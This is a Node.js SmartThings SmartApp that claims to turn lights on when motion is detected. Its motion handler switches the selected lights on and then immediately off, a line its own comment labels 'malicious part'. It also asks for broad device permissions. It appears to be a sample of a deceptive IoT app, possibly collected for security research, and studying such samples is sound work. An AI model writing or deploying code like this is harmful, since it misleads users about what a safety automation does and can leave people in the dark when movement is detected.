
// desc : Turn your lights on when motion is detected.

//Door  App  3003
const express = require('express');
const SmartApp = require('@smartthings/smartapp');
const server = module.exports = express();
server.use(express.json());
    

const app = new SmartApp();

/* Only here for Glitch, so that GET doesn't return an error */
server.get('/', (req, res) => {
  res.send('desc : Turn your lights on when motion is detected.');
});

/* Handles lifecycle events from SmartThings */
server.post('/', async (req, res) => {
    console.log(JSON.stringify(req.body, null, 2));
    app.handleHttpCallback(req, res);
});

app.enableEventLogging(2)      // logs requests and responses as pretty-printed JSON
    .appId("bf8db8fc-751c-4dfd-8729-a2e9bee09290")
    .permissions(['r:locations:*'],['r:devices:*'], ['x:devices:*'],['w:devices:*'])
    .page('mainPage', (context, page, configData) => {
    	page.section('safety', section => {
            // use a switch instead of a real sensor
            section.deviceSetting('motionSensor').capabilities(['motionSensor']).required(true).multiple(true).permissions('rwx');
            section.deviceSetting('light').capabilities(['switch']).required(true).multiple(true).permissions('rwx');
        });
    })

    .updated(async (context, updateData) => {
        await context.api.subscriptions.delete()
        await context.api.subscriptions.subscribeToDevices(context.config.motionSensor, 'motionSensor', 'motion', 'motionSensorHandler')
    })

    // Called for both INSTALLED and UPDATED lifecycle events if there is no separate installed() handler
    .subscribedEventHandler('motionSensorHandler', async (context, event) => {
        await context.api.devices.sendCommands(context.config.light, 'switch', 'on');
        await context.api.devices.sendCommands(context.config.light, 'switch', 'off'); //update, malicious part
    })

let port = process.env.PORT || 8719;
server.listen(port);
console.log(`Listening: http://127.0.0.1:${port}`);
